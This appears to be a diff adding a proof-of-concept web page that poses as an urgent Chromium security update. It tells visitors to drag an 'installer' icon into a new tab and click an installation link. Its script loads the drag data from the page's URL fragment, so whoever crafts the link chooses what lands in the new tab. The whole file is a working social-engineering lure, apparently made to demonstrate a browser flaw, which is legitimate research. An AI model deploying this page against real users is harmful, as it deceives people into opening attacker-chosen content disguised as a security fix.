@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Security Alert!</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto">
+</head>
+<body>
+    <div class="center">
+        <h1>
+            <span style="color: gray">(This is a proof of concept page)</span><br>
+            A major vulnerability in Chromium is currently being exploited in the wild!
+            Please update your Chromium version by following the instructions below:
+        </h1>
+        <br>
+        <p>
+            1. Drag the following installer icon into a new tab: <br>
+        </p>
+        <div draggable="true" id="installer_drag"></div><br>
+        <p>
+            2. In the new tab, click on the installation link, as shown in the following image:<br>
+        </p>
+    </div>
+    <img id="update-link-img" src="update_link.png">
+    <style>
+        h1 {
+            text-align: center;
+        }
+        p {
+            font-size: 120%;
+        }
+        .center {
+            position: absolute;
+            top: 40%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 80%;
+        }
+        html, body {
+            height: 100%;
+        }
+        body {
+            font-family: "Roboto";
+        }
+        #installer_drag {
+            background: url("installer_drag.png");
+            background-size: contain;
+            width: 10rem;
+            height: 10rem;
+        }
+        #update-link-img {
+            position: absolute;
+            top: 80%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 80%;
+        }
+    </style>
+    <script> 
+        function dragstart_handler(ev) {
+            ev.dataTransfer.setData("text/plain", decodeURIComponent(location.hash.slice(1)));
+        }
+
+        window.addEventListener("DOMContentLoaded", () => {
+            const element = document.getElementById("installer_drag");
+            element.addEventListener("dragstart", dragstart_handler);
+        });
+    </script>
+</body>
+</html>
